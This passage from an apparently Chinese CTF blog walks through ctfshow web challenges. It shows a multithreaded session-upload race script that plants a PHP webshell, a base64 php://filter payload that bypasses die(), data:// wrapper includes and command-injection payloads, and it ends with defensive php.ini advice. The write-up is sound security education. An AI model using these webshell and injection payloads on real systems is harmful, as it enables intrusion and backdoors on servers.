 <span class="hljs-comment"># 设置Session ID</span><br>            &#125;,<br>            <br>            <span class="hljs-comment"># 上传的文件</span><br>            files=&#123;<br>                <span class="hljs-comment"># 文件字段名：&#x27;file&#x27;</span><br>                <span class="hljs-comment"># 文件名：&#x27;ctfshow.jpg&#x27;</span><br>                <span class="hljs-comment"># 文件内容：50KB的&#x27;a&#x27;</span><br>                <span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;ctfshow.jpg&#x27;</span>, fileBytes)<br>            &#125;<br>        )<br></code></pre></td></tr></table></figure><p><strong>为什么需要大文件？</strong></p><ul><li>PHP只在上传过程中保持Session文件打开</li><li>50KB文件确保上传时间足够长（约几秒）</li><li>这样攻击者有时间在文件被清空前利用它</li></ul><p><strong>Session文件如何被污染？</strong></p><ol><li>设置Cookie: <code>PHPSESSID=ctfshow</code></li><li>开始上传文件</li><li>PHP自动创建文件：<code>/tmp/sess_ctfshow</code></li><li>将<code>PHP_SESSION_UPLOAD_PROGRESS</code>的值写入该文件</li><li>文件内容变为：<code>upload_progress_&lt;?php eval($_POST[1]);?&gt;</code></li></ol><hr><h4 id="读线程函数（负责执行恶意代码）"><a href="#读线程函数（负责执行恶意代码）" class="headerlink" title="读线程函数（负责执行恶意代码）"></a>读线程函数（负责执行恶意代码）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:  <span class="hljs-comment"># 无限循环</span><br>        <span class="hljs-comment"># 第一步：触发文件包含漏洞执行恶意代码</span><br>        res1 = session.post(<br>            <span class="hljs-comment"># 利用文件包含漏洞：?file=/tmp/sess_ctfshow</span><br>            url + <span class="hljs-string">&#x27;?file=/tmp/sess_&#x27;</span> + sessionid,<br>            <br>            <span class="hljs-comment"># 发送要执行的代码</span><br>            data=data,  <span class="hljs-comment"># 就是前面定义的创建Webshell的代码</span><br>            <br>            cookies=&#123;<span class="hljs-string">&quot;PHPSESSID&quot;</span>: sessionid&#125;  <span class="hljs-comment"># 保持同一个Session</span><br>        )<br>        <br>        <span class="hljs-comment"># 第二步：检查Webshell是否创建成功</span><br> <br>        res2 = session.get(url + <span class="hljs-string">&#x27;2.php&#x27;</span>)<br>        <br>        <span class="hljs-comment"># 如果返回200状态码，说明文件存在</span><br>        <span class="hljs-keyword">if</span> res2.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;+++done+++&quot;</span>)  <span class="hljs-comment"># 成功提示</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(res2.status_code)  <span class="hljs-comment"># 打印错误代码</span><br></code></pre></td></tr></table></figure><p><strong>攻击链解析</strong>：</p><ol><li>请求包含Session文件：<code>?file=/tmp/sess_ctfshow</code></li><li>服务器执行该文件中的PHP代码：<code>eval($_POST[1])</code></li><li><code>$_POST[1]</code>的值是我们发送的：<code>file_put_contents(...)</code></li><li>所以实际执行：<code>file_put_contents(&#39;/var/www/html/2.php&#39;, &#39;&lt;?php eval($_POST[2]);?&gt;&#39;)</code></li><li>在网站根目录创建<code>2.php</code>，内容为Webshell代码</li></ol><hr><h4 id="多线程主程序"><a href="#多线程主程序" class="headerlink" title="多线程主程序"></a>多线程主程序</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    event = threading.Event()  <span class="hljs-comment"># 线程事件对象（实际未使用）</span><br>    <br>    <span class="hljs-comment"># 创建持久会话（自动管理cookies）</span><br>    <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-comment"># 启动5个写线程</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>            threading.Thread(target=write, args=(session,)).start()<br>        <br>        <span class="hljs-comment"># 启动5个读线程</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>            threading.Thread(target=read, args=(session,)).start()<br>    <br>    event.<span class="hljs-built_in">set</span>()  <span class="hljs-comment"># 设置事件（实际未使用）</span><br></code></pre></td></tr></table></figure><p><strong>为什么需要多线程？</strong>（<strong>就算先删除临时目录再包含，也可以写进去shell</strong>)</p><ol><li><strong>竞争条件</strong>：Session文件在上传结束后会被PHP清空</li><li>写线程不断创建&#x2F;更新Session文件</li><li>读线程不断尝试在文件被清空前包含它</li><li>多个线程增加成功率（类似不断尝试开锁）</li></ol><hr><h3 id="Webshell使用示例"><a href="#Webshell使用示例" class="headerlink" title="Webshell使用示例"></a>Webshell使用示例</h3><p>成功创建<code>2.php</code>后，攻击者可以发送：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/2.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>目标网站<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="language-ini"><span class="hljs-attr">2</span>=system(<span class="hljs-string">&quot;ls -la /&quot;</span>)<span class="hljs-comment">;</span></span><br></code></pre></td></tr></table></figure><p><strong>结果</strong>：</p><ul><li>服务器会执行<code>ls -la /</code>（列出根目录所有文件）</li><li>返回结果给攻击者</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br>...<br>total 123<br>drwxr-xr-x  1 root root   4096 Jun 14 12:34 .<br>drwxr-xr-x  1 root root   4096 Jun 14 12:34 ..<br>-rw-r--r--  1 root root    148 Aug 17  2022 .bashrc<br>...<br></code></pre></td></tr></table></figure><hr><h3 id="为什么这个攻击有效？"><a href="#为什么这个攻击有效？" class="headerlink" title="为什么这个攻击有效？"></a>为什么这个攻击有效？</h3><ol><li><p><strong>Session文件可控</strong>：</p><ul><li>唯一无需后缀即可写入PHP代码的地方</li><li>通过<code>PHP_SESSION_UPLOAD_PROGRESS</code>控制内容</li></ul></li><li><p><strong>文件包含漏洞</strong>：</p><ul><li>网站有类似<code>include($_GET[&#39;file&#39;])</code>的代码</li><li>允许读取<code>/tmp/sess_xxx</code>文件</li></ul></li><li><p><strong>时间窗口利用</strong>：</p><ul><li>大文件上传延长Session文件存在时间</li><li>多线程不断尝试利用这个时间窗口</li></ul></li></ol><hr><h3 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h3><ol><li><p>关闭危险功能：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">; php.ini 配置</span><br><span class="hljs-attr">session.upload_progress.enabled</span> = <span class="hljs-literal">Off</span><br></code></pre></td></tr></table></figure></li><li><p>限制文件包含：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 不要直接包含用户输入</span><br><span class="hljs-variable">$allowed</span> = [<span class="hljs-string">&#x27;header.php&#x27;</span>, <span class="hljs-string">&#x27;footer.php&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>], <span class="hljs-variable">$allowed</span>)) &#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>设置open_basedir：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">; 限制PHP可访问的目录</span><br><span class="hljs-attr">open_basedir</span> = /var/www/html:/tmp<br></code></pre></td></tr></table></figure></li><li><p>Session文件隔离：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">; 为每个用户设置独立Session目录</span><br><span class="hljs-attr">session.save_path</span> = <span class="hljs-string">&quot;/var/lib/php/sessions&quot;</span><br></code></pre></td></tr></table></figure></li></ol><p>这个攻击利用了PHP的多个特性和配置默认值，通过精心构造的请求在服务器上创建后门。理解每个步骤对于防御此类攻击至关重要。</p><h3 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h3><p>需要用GET传入一个参数file和用POST传入一个参数content，后面是对file参数内容的过滤</p><p>file_put_contents(urldecode($file), “<?php die(‘大佬别秀了’);?>”.$content);</p><ul><li>使用<code>file_put_contents</code>函数将字符串写入到由<code>$file</code>指定的文件中。在写入之前，<code>$file</code>经过了<code>urldecode</code>函数处理，这意味着如果文件名是URL编码的，它会被解码。写入的内容首先是<code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt;</code>，这是一个PHP脚本，当文件被作为PHP执行时会立即终止执行并显示消息”大佬别秀了”。然后是变量<code>$content</code>的值。</li></ul><p>那么 file_put_contents 函数，将会往 $file 里写入 <code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt;</code> 和我们 post 传入的 $content 内容。</p><p>这时候我们可以想到file参数被过滤了很多东西，所以我们可以在content参数中传入一句话木马，但由于会同时写入一个die指令，这时候就需要我们去绕过这个死亡函数了</p><p>由于这里 url 传入的内容本身会进行一次 url 解码，题目中还使用了一个 urldecode 函数，因此 file 传入的内容需要先经过两次 url 编码再传入。</p><p>content是写入内容,要进行base64编码  对应上面的伪协议解码,而base解码时,是4个一组,flag.php(要写入的文件),写入的内容中只有phpdie会参与base64解码,因为phpdie只有6个字节,补两个a就是8字节了）（aaPD9waHAgc3lzdGVtKCdscycpOz8+）11是补给前面的 （结果就是phpdie11PD9waHAgQGV2YWwoJF9HRVRbJ2NtZCddKTs&#x2F;Pg&#x3D;&#x3D;（四个一组））</p><p>file 传入 php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;shell.php</p><p>进行二次编码后得到:</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?<span class="hljs-keyword">file</span>=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%37%30%25%36%38%25%37%30<br></code></pre></td></tr></table></figure><p>对 webshell 进行 base64 编码：</p><p>webshell：<code>&lt;?php @eval($_GET[&#39;cmd&#39;]);?&gt;</code></p><p>编码后得到:<br>PD9waHAgQGV2YWwoJF9HRVRbJ2NtZCddKTs&#x2F;Pg&#x3D;&#x3D;</p><p>注意我们还需要加两个合法字符让前面 base64 解码成功，这里多传入两个1。</p><p>post 传入：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">content</span><span class="hljs-operator">=</span><span class="hljs-number">11</span>PD9waHAgQGV2YWwoJF9HRVRbJ2NtZCddKTs/Pg<span class="hljs-operator">=</span><span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure><p>然后调用shell.php，传入cmd</p><p><img src="/%5Cimages%5Cweb87.png"></p><h3 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; &gt;?<br></code></pre></td></tr></table></figure><p>用伪协议：</p><p>?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,[base64_encode_shell]</p><p><img src="/%5Cimages%5Cweb88-1.png"></p><p>改成base64后没有被过滤的符号的，可以添加echo ‘a’或者&gt;末尾任意添加</p><p><img src="/%5Cimages%5Cweb88-2.png"></p><p>即可得到flag</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>命令执行</title>
    <link href="/2025/01/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2025/01/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="命令执行常见函数："><a href="#命令执行常见函数：" class="headerlink" title="命令执行常见函数："></a>命令执行常见函数：</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">system</span><span class="hljs-params">()</span></span>    <span class="hljs-comment">// 执行外部程序并显示输出</span><br><span class="hljs-function"><span class="hljs-title">exec</span><span class="hljs-params">()</span></span>      <span class="hljs-comment">// 执行外部程序</span><br><span class="hljs-function"><span class="hljs-title">passthru</span><span class="hljs-params">()</span></span>  <span class="hljs-comment">// 执行外部程序并显示原始输出</span><br><span class="hljs-function"><span class="hljs-title">shell_exec</span><span class="hljs-params">()</span></span> <span class="hljs-comment">// 通过shell执行命令</span><br>`` ``<br>(反引号)    <span class="hljs-comment">// 执行shell命令</span><br><span class="hljs-function"><span class="hljs-title">popen</span><span class="hljs-params">()</span></span>     <span class="hljs-comment">// 打开进程文件指针</span><br><span class="hljs-function"><span class="hljs-title">proc_open</span><span class="hljs-params">()</span></span> <span class="hljs-comment">// 执行命令并打开文件指针</span><br></code></pre></td></tr></table></figure><h2 id="常用连接符："><a href="#常用连接符：" class="headerlink" title="常用连接符："></a>常用连接符：</h2><pre><code class="hljs">; 顺序执行多条命令(Unix)&amp; 后台执行&amp;&amp; 前一条成功才执行后一条| 管道符|| 前一条失败才执行后一条\n(换行符) 也可作为命令分隔符</code></pre><h3 id="管道符："><a href="#管道符：" class="headerlink" title="管道符："></a>管道符：</h3><p>在命令注入攻击中，管道符可以：</p><p><strong>串联多个命令</strong>：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">http://example.<span class="hljs-keyword">com</span>/vuln.php?<span class="hljs-built_in">input</span>=<span class="hljs-keyword">file</span>.txt|whoami<br></code></pre></td></tr></table></figure><p>尝试执行<code>file.txt</code>后接着执行<code>whoami</code></p><p><strong>过滤或处理输出</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://example.com/vuln.php?input=<span class="hljs-built_in">ls</span>|<span class="hljs-built_in">base64</span><br></code></pre></td></tr></table></figure><p>将<code>ls</code>命令的输出进行base64编码</p><h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br><br></code></pre></td></tr></table></figure><p> 检查 HTTP 请求中是否包含名为 c 的参数。如果存在，执行后续代码；否则，跳到 else 语句。</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$c = $_GET[<span class="hljs-string">&#x27;c&#x27;</span>]<span class="hljs-comment">; </span><br></code></pre></td></tr></table></figure><p>获取 HTTP 请求中的 c 参数并将其赋值给变量 $c。 （此处的$c不一定是c，只是更好理解罢了）</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">(!preg_match(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>)</span></span>)&#123; <br></code></pre></td></tr></table></figure><p>使用 preg_match() 函数对 $c 变量进行正则匹配。这个正则表达式检查 $c 中是否包含不区分大小写的字符串 “flag”。如果 $c 中不包含 “flag”，则继续执行后续代码。</p><p>eval($c); 使用 eval() 函数执行 $c 变量中的代码。eval() 会将 $c 中的字符串作为 PHP 代码执行，这可能导致执行任意 PHP 代码，从而形成安全漏洞。</p><p>eval($_GET[2])：</p><ul><li><code>eval()</code> 执行字符串作为 PHP 代码。</li><li><code>$_GET[2]</code> 从 URL 参数 <code>2</code> 获取值（如 <code>&amp;2=system(...)</code>）。</li><li>这允许 <strong>动态执行任意命令</strong>，无需修改 User-Agent 反复注入。</li></ul><p>} 结束 if(!preg_match(“&#x2F;flag&#x2F;i”, $c)) 语句的判断。</p><p>}else{ 如果 $_GET[‘c’] 不存在（即 c 参数没有传递），则执行以下代码。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">highlight_file</span>(FILE); <br></code></pre></td></tr></table></figure><p>highlight_file() 函数将当前 PHP 文件的源代码高亮显示。FILE 是一个常量，它表示当前脚本的文件路径。这意味着如果没有 c 参数，脚本将显示自身的源代码。</p><p>} 结束else语句块</p><p>尝试url&#x2F;?c&#x3D;system(‘ls’);（<strong>闭合标签<code>?&gt;</code></strong>：当PHP遇到<code>?&gt;</code>时，会<strong>自动在结尾插入分号</strong>（称为”隐含分号”），因此<code>system(&#39;ls&#39;)?&gt;</code>等价于<code>system(&#39;ls&#39;);</code>）</p><p>当程序执行到 system(‘ls’) 时，会调用系统的 Shell（如 Bash），运行 ls 命令，列出当前目录下的文件和文件夹（相当于在终端直接输入 ls）。</p><p>得到</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">flag.php <span class="hljs-keyword">index</span>.php<br></code></pre></td></tr></table></figure><h4 id="cat：正序，查看-合并文件"><a href="#cat：正序，查看-合并文件" class="headerlink" title="cat：正序，查看&#x2F;合并文件"></a>cat：正序，查看&#x2F;合并文件</h4><h4 id="tac：倒序，查看日志时，优先显示最新行"><a href="#tac：倒序，查看日志时，优先显示最新行" class="headerlink" title="tac：倒序，查看日志时，优先显示最新行"></a>tac：倒序，查看日志时，优先显示最新行</h4><p>本题flag被ban，用通配符*，访问?c&#x3D;system(‘tac fla*.php’);得到flag，访问?c&#x3D;system(‘cat fla*.php’);无显示，查看源代码得到flag</p><p><strong>tac</strong>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">flag = <span class="hljs-string">&#x27;ctfshow&#123;7b9e92b8-e4c5-4478-a9eb-e4a8862691a5&#125;&#x27;</span>;</span><br><br>*/<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">@<span class="hljs-built_in">link</span>: https://ctfer.com</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">@email: h1xa@ctfer.com</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">@Last Modified <span class="hljs-keyword">time</span>: 2020-09-04 00:14:17</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">@Last Modified by:   h1xa</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">@Date:   2020-09-04 00:14:07</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">@Author: h1xa</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">-*- coding: utf-8 -*-</span><br>/*<br><br>&lt;?php<br></code></pre></td></tr></table></figure><p>输出顺序：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;/html&gt;       <span class="hljs-comment">// 浏览器认为文档已结束</span><br>...<br>&lt;html&gt;        <span class="hljs-comment">// 被当作普通文本</span><br><span class="hljs-meta">&lt;?php</span> ... <span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">// 全部当作文本显示</span><br></code></pre></td></tr></table></figure><p>→ Flag直接可见</p><p><strong>cat</strong>（源代码）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-04 00:14:07</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-04 00:14:17</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;ctfshow&#123;c78ff3fc-09d6-4aa0-9b59-689b0eefebd3&#125;&#x27;</span>;<br><br></code></pre></td></tr></table></figure><p>输出顺序：</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-php"><span class="hljs-meta">&lt;?php</span> ... <span class="hljs-meta">?&gt;</span></span><span class="language-xml">  // PHP引擎执行，可能抑制输出</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>        // 浏览器开始解析</span><br><span class="language-xml">...</span><br><span class="language-xml"><span class="hljs-comment">&lt;!-- flag --&gt;</span> // 可能被隐藏</span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><p><em>!preg_match(“&#x2F;flag|system|php&#x2F;i”, $c</em></p><p>用<strong>passthru</strong>代替<strong>system</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=passthru(<span class="hljs-string">&#x27;tac fla*.ph*&#x27;</span>);<br></code></pre></td></tr></table></figure><p>通配符：?匹配单个字符，*匹配任何数量字符，可以是0</p><h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><p><a href="https://blog.csdn.net/weixin_51213906/article/details/123010661">PHP-RCE绕过的姿势总结_rce如何绕过对system的过滤-CSDN博客</a></p><h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><p><em>if(!preg_match(“&#x2F;flag|system|php|cat|sort|shell|.| |&#39;|`|echo|;|(&#x2F;i”, $c)){</em> </p><p>先尝试用?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;system(‘ls’);</p><ul><li>原始代码：<code>include$_GET[1]?&gt;</code><ul><li><code>?&gt;</code> 是PHP的闭合标签，表示PHP代码结束。后续内容（<code>&amp;1=data://...</code>）会被视为普通文本（非PHP代码）。</li></ul></li><li>若替换为<code>include$_GET[1];</code>：<ul><li>分号<code>;</code>表示语句结束，但<strong>缺少空格</strong>导致语法错误。PHP会将<code>include$_GET[1]</code>视为一个未定义的常量（而非<code>include</code>关键字），从而报错。</li></ul></li></ul><p>payload：<code>url/?c=include $_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(&#39;ls&#39;); ?&gt;</code></p><p>区别在于<code>1</code>参数的值：</p><ul><li>失败案例：纯字符串 <code>system(&#39;ls&#39;);</code></li><li>成功案例：<code>data://</code>协议封装的数据流</li></ul><h4 id="include语句的工作机制"><a href="#include语句的工作机制" class="headerlink" title="include语句的工作机制"></a><strong><code>include</code>语句的工作机制</strong></h4><p>当执行 <code>include $_GET[1]</code> 时：</p><ol><li>PHP会尝试将 <code>$_GET[1]</code> 的值作为<strong>文件路径</strong>处理</li><li>读取该路径的内容</li><li>将内容当作PHP代码执行</li></ol><h4 id="失败案例解析"><a href="#失败案例解析" class="headerlink" title="失败案例解析"></a><strong>失败案例解析</strong></h4><p>payload1实际执行：<code>include &quot;system(&#39;ls&#39;);&quot;</code></p><p>PHP行为：</p><ol><li>尝试打开名为 <code>system(&#39;ls&#39;);</code> 的文件</li><li>文件系统不存在此文件 → 触发警告</li><li>最终执行的是文件内容（空），而非代码</li></ol><p>payload2实际执行：<code>include &quot;data://text/plain,&lt;?php system(&#39;ls&#39;); ?&gt;&quot;</code></p><p>PHP行为：</p><ol><li>识别<code>data://</code>协议处理器</li><li>解码数据流：<code>&lt;?php system(&#39;ls&#39;); ?&gt;</code></li><li><strong>执行其中的PHP代码</strong> → 